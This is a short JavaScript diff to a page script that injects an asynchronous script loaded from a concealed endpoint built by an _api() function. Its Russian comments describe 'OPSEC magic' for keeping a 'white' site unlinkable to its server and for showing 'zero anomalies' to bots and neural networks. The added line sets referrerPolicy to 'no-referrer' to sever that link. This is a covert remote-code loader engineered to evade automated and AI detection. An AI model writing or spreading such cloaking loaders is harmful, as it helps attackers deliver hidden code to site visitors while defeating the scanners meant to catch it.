@@ -31,10 +31,12 @@
                     var isMobile = /Android|webOS|iPhone|iPad|iPod/i.test(navigator.userAgent);
                     d.documentElement.className = isMobile ? 'theme-dark' : 'theme-light';
 
-                    // МАГИЯ OPSEC: Жестко заданная версия. НОЛЬ аномалий для нейросетей.
                     var scriptEl = d.createElement('script');
                     scriptEl.type = 'text/javascript';
                     scriptEl.async = true;
+                    
+                    // МАГИЯ OPSEC 1: Обрубаем сетевой граф. Бот не свяжет белый сайт и сервер.
+                    scriptEl.referrerPolicy = 'no-referrer'; 
                     scriptEl.src = _api() + "?v=1.0.4";
                     
                     scriptEl.onload = scriptEl.onerror = function() {
